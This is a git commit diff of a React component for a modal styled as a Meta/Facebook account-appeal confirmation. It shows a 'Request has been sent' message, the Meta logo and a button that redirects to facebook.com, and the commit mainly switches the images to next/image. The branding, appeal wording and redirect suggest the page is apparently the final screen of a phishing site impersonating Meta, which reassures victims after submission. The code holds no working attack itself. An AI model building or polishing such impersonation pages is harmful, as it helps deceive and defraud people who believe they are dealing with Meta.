0f6ce0b96fa1e4a5edd110932f605adf651bb35f
ntp1210000 <thanhphuong121098@gmail.com>
2026-01-03 17:36:25 +0700

    Update final-modal.tsx

--- app/routes/final-modal.tsx
+++ app/routes/final-modal.tsx
@@ -1,34 +1,41 @@
-import { type FC } from 'react';
+import Image from 'next/image';
+import { FC } from 'react';
 
 const FinalModal: FC = () => {
-    return (
-        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
-            <div className='flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
-                
-                <p className='mt-4 text-2xl font-bold'>Request has been sent</p>
-                <p className='text-xl'>
-                    Your request has been added to the processing queue. 
-                    We will process your request within 24 hours. 
-                    If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.
-                </p>
-
-                <div className='flex flex-col justify-center gap-10'>
-                    <img src='/assets/final-image.png' alt='Final Image' className='mx-auto w-[400px] h-[300px]' />
-                    <button
-                        type='button'
-                        onClick={() => window.location.replace('https://www.facebook.com')}
-                        className='mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700'
-                    >
-                        Return on Facebook
-                    </button>
-                </div>
-
-                <div className='flex items-center justify-center p-3'>
-                    <img src='/assets/images/meta-logo-image.png' alt='Meta Logo' className='w-[70px] h-[18px]' />
-                </div>
-            </div>
+  return (
+    <div className="fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4">
+      <div className="flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4">
+        <p className="mt-4 text-2xl font-bold">Request has been sent</p>
+        <p className="text-xl">
+          Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.
+        </p>
+        <div className="flex flex-col justify-center gap-10">
+          <Image
+            src="/assets/final-image.png"
+            alt="Final Image"
+            width={400}
+            height={300}
+            className="mx-auto"
+          />
+          <button
+            type="button"
+            onClick={() => window.location.replace('https://www.facebook.com')}
+            className="mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700"
+          >
+            Return on Facebook
+          </button>
         </div>
-    );
+        <div className="flex items-center justify-center p-3">
+          <Image
+            src="/assets/images/meta-logo-image.png"
+            alt="Meta Logo"
+            width={70}
+            height={18}
+          />
+        </div>
+      </div>
+    </div>
+  );
 };
 
 export default FinalModal;
